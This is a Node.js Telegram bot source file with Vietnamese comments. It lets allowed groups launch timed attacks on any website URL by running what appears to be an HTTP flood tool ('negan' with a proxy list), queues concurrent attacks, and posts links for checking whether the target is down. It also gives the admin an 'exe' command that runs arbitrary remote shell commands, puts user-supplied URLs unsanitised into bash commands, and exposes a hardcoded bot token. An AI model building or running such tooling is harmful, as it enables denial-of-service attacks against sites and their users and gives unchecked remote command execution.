const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const os = require('os');

// Cấu hình
const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
const adminId = 1243471275;
const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);
const maxConcurrentAttacks = 3, maxSlot = 1, maxTimeAttacks = 120;

// Khởi tạo bot
const bot = new TelegramBot(token, { polling: true });
const currentAttacks = new Map(), attackQueue = [];
const userProcesses = new Map(); // Lưu trữ tiến trình của người dùng

// Thông báo bot đã sẵn sàng
let isBotReady = true;
bot.sendMessage(adminId, '[Version PRO] 🤖 Bot đã sẵn sàng nhận lệnh.');
console.log('[DEBUG] Bot đã khởi động xong và sẵn sàng nhận lệnh.');

// Hàm định dạng thời gian theo múi giờ Việt Nam (GMT+7)
const getVietnamTime = () => new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });

// Hàm gửi thông báo dưới dạng Markdown
const sendMarkdownMessage = async (chatId, message) => {
    try {
        await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error(`[ERROR] Gửi tin nhắn thất bại: ${error.message}`);
    }
};

// Hàm thực thi lệnh
const executeCommand = async (chatId, command, host, time, username) => {
    const pid = Math.floor(Math.random() * 10000);
    const startMessage = `🚀 Successfully 🚀\nPID: ${pid}\nWEBSITE: ${host}\nTime: ${time} Seconds\nCaller: @${username}\nMax concurrent attacks: ${maxSlot} slots\n[Check Host](https://check-host.net/check-http?host=${host}) | [Host Tracker](https://www.host-tracker.com/en/ic/check-http?url=${host})`;
    await sendMarkdownMessage(chatId, startMessage);

    const child = exec(command, { shell: '/bin/bash' });
    userProcesses.set(chatId, { pid, startTime: Date.now(), time }); // Lưu tiến trình của người dùng

    child.on('close', () => {
        const endTime = getVietnamTime();
        const completeMessage = `✅ Process Completed:\nPID: ${pid}\nWEBSITE: ${host}\nTime: ${time} Seconds\nCaller: @${username}\nEnd Time: ${endTime}`;
        sendMarkdownMessage(chatId, completeMessage);
        currentAttacks.delete(chatId);
        userProcesses.delete(chatId); // Xóa tiến trình của người dùng khi hoàn thành
        if (attackQueue.length > 0) {
            const nextAttack = attackQueue.shift();
            executeCommand(nextAttack.chatId, nextAttack.command, nextAttack.host, nextAttack.time, nextAttack.username);
        }
    });
};

// Xử lý lệnh từ người dùng
bot.on('message', async (msg) => {
    const chatId = msg.chat.id, text = msg.text, isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId);
    const username = msg.from.username || msg.from.first_name;

    // Kiểm tra quyền thực thi lệnh
    if (!isAdmin && !isGroup) return sendMarkdownMessage(chatId, '🚫 You do not have permission to execute this command.');

    // Xử lý lệnh tấn công (URL + thời gian)
    if (text.startsWith('http://') || text.startsWith('https://')) {
        const parts = text.split(' ');
        if (parts.length !== 2 || isNaN(parts[1])) return sendMarkdownMessage(chatId, '🚫 Invalid format! Enter: <URL> <time>.');
        const [host, time] = parts;
        if (time > maxTimeAttacks) return sendMarkdownMessage(chatId, `🚫 Maximum time is ${maxTimeAttacks} seconds.`);

        // Kiểm tra xem người dùng có tiến trình đang chạy không
        if (userProcesses.has(chatId)) {
            const remainingTime = userProcesses.get(chatId).time - (Date.now() - userProcesses.get(chatId).startTime) / 1000;
            return sendMarkdownMessage(chatId, `🚫 You already have a running command. Please wait for the current process to complete. Remaining time: ${Math.ceil(remainingTime)} seconds.`);
        }

        // Kiểm tra số lệnh đang chạy toàn hệ thống
        if (currentAttacks.size >= maxConcurrentAttacks) {
            attackQueue.push({ chatId, command: `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, host, time, username });
            return sendMarkdownMessage(chatId, '⏳ Your command has been added to the queue. Please wait...');
        }

        const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
        currentAttacks.set(chatId, { user: chatId, command, startTime: Date.now() });
        executeCommand(chatId, command, host, time, username);
        return;
    }

    // Xử lý lệnh exe (chỉ admin)
    if (text.startsWith('exe ') && isAdmin) {
        const command = text.slice(4).trim();
        if (!command) return sendMarkdownMessage(chatId, '🚫 Command cannot be empty. Example: exe ls');
        const child = exec(command, { shell: '/bin/bash' });
        let output = '';
        child.stdout.on('data', (data) => output += data.toString());
        child.stderr.on('data', (data) => output += data.toString());
        child.on('close', () => sendMarkdownMessage(chatId, `🚀 Command Result: ${command}\n\`\`\`\n${output}\n\`\`\``));
        return;
    }

    // Lệnh không hợp lệ
    sendMarkdownMessage(chatId, '🚫 Invalid command. Please start the command with "exe" or enter URL and time.');
});
